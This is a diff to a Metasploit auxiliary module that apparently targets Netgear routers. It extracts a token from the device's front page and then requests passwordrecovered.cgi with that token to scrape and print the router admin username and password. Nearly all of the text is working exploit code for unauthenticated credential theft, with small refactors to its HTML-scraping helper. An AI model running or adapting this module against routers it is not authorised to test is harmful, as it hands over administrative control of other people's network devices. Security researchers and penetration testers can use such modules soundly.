@@ -39,18 +39,9 @@ class MetasploitModule < Msf::Auxiliary
     ], self.class)
   end
 
-  # This is roughly ported from python 
-  # 
-  # But not very well apparently
-  # I kind of replaced this with some regex magic
-  # TODO maybe remove check()
+  # @return substring of 'text', usually a response from a server in this case
   def scrape(text, start_trig, end_trig)
-    if text.include?(start_trig) != -1
-      puts "I'm scraping :D" # NOTE remove this when finished
-      return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
-    else
-      return nil
-    end
+    return text[/#{start_trig}(.*?)#{end_trig}/m, 1]
   end
 
   def run
@@ -64,10 +55,9 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_raw({ 'uri' => '/'})
 
     if is_ng == Exploit::CheckCode::Detected
-      #token = scrape(res.to_s, "unauth.cgi?id=", "/")
       marker_one = "id="
       marker_two = "\""
-      token = res.to_s[/#{marker_one}(.*?)#{marker_two}/m, 1]
+      token = scrape(res.to_s, marker_one, marker_two)
       if token == nil
         print_error("#{rhost} is not vulnerable: Token not found")
         return
@@ -77,17 +67,17 @@ class MetasploitModule < Msf::Auxiliary
       
       r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
-      # TODO make this work
-      # rindex() doesn't seem to work
-      if r.to_s.rindex('Left\">') != nil
-        username = scrape(r.to_s, 'Router Admin Username</td>', '</td>')
-        username = scrape(username, '>', '\'')
-        password = scrape(r.to_s, 'Router Admin Password</td>', '</td>')
-        password = scrape(password, '>', '\'')
-        puts username
-        puts password
+
+      if r.to_s.include?('left">') != nil
+        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td>
+			<td class=\"MNUText\" align=\"left\">", "</td>")
+        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td>
+			<td class=\"MNUText\" align=\"left\">", "</td>")
+
+        print_good("Creds found: #{username}/#{password}")
+        
       else # for debugging :)
-        puts "fuck"
+        print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
     else
       return
